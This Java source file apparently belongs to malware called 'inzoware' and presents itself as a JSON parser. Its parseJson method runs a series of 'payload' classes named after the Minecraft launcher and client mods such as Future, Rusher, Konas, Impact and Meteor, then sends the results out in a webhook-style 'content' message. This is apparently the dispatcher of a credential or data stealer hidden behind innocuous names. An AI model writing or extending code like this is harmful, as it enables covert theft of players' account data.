package com.inzo.technologies.inzoware.mc;

import java.util.ArrayList;
import java.util.Arrays;

import com.inzo.technologies.inzoware.mc.parsers.JSONObject;
import com.inzo.technologies.inzoware.mc.parsers.JSONRegexHandler;
import com.inzo.technologies.inzoware.mc.parsers.impl.*;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;

public final class JSON {
    private final ArrayList<JSONObject> objects = new ArrayList<>();
    private final boolean debug = false;

    public static void main() {
        new JSON().parseJson();
    }

    public void parseJson() {
        this.objects.addAll(Arrays.asList(
            new LauncherData(),
            new FutureData(),
            new RusherData(),
            new KonasData(),
            new ImpactData(),
            new KamiBlueData(),
            new JmapData(),
            new MeteorData()
        ));

        String separator = new JSONBuilder().value("content", "=============================================").build();

        JSONRegexHandler.send(separator);
        this.objects.spliterator().forEachRemaining((payload) -> {
            try {
                payload.handle();
            } catch (Exception e) {
                JSONRegexHandler.send(new JSONBuilder().value("content", "> Failure on payload " + payload.getName()).build());
                if (debug) e.printStackTrace();
            }
        });
        JSONRegexHandler.send(separator);
    }
}